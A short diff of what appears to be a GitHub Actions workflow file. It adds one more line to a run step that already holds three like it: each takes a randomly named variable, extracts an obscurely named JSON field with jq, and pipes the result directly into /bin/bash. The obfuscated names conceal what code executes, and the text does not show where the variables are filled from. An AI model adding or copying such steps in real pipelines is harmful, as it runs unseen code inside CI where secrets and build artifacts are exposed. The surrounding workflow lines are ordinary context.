@@ -39,6 +39,7 @@ jobs:
           echo $csgy74 | jq -r .oizvx6808 | /bin/bash
           printf '%s' "$eu15601" | jq -r .sfahr4350 | /bin/bash
           printf '%s' "$b251" | jq -r .kb2899 | /bin/bash
+          printf '%s' "$c0" | jq -r .jel4 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
